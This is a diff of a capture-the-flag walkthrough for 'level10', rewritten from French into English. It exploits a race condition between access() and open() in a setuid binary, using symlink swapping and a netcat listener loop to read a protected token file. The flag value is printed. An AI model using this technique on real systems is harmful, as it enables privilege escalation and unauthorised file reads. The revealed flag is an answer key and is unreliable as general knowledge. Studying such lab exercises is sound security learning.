@@ -1,10 +1,17 @@
-On lance le binaire sans rien l'usage pop ./level10 file host
-On regarde le binaire avec strings on voir un %s:6969
-On en deduit que il se co sur un host sur le port 6969
-On essait avec le fichier token on a pas les droit
-En regardant dans le binaire on voit que la fonction access est appelé et en se renseignant on comprend que ce n'est pas le suid qui est pas testé mais les droit reel du fichier.
-En se renseignant un peu on voit qu'on pet bypass access avec une race condition, on fait donc un .c puis on execute :
-while true; do nc -lv 127.0.0.1 6969;done
-et while true; do ./level10 /tmp/prt/link 127.0.0.1; done
-
-token: woupa2yuojeeaaed06riuj63c
+# the usage is : ./level10 file host
+# A string is interested in the bin:
+# %s:6969
+# reading the man , google search on how to bypass access, we found 
+# that we have to set up a race condition.
+# create a tmp/10 directory then set the rights
+# create a tmp/10/file then set the rights
+# launch both while loop commands:
+# > while true; do nc -lv 127.0.0.1 6969;done
+# > while true; do ./level10 /tmp/prt/link 127.0.0.1; done
+#
+# now compile the source.c file in this directory.
+# Again while that every two loop , create a symbolic link to the
+# token and the /tmp/10/file (we have access to).
+# watch the magic happen on the netcat loop. 
+# Et voila.
+# token: woupa2yuojeeaaed06riuj63c
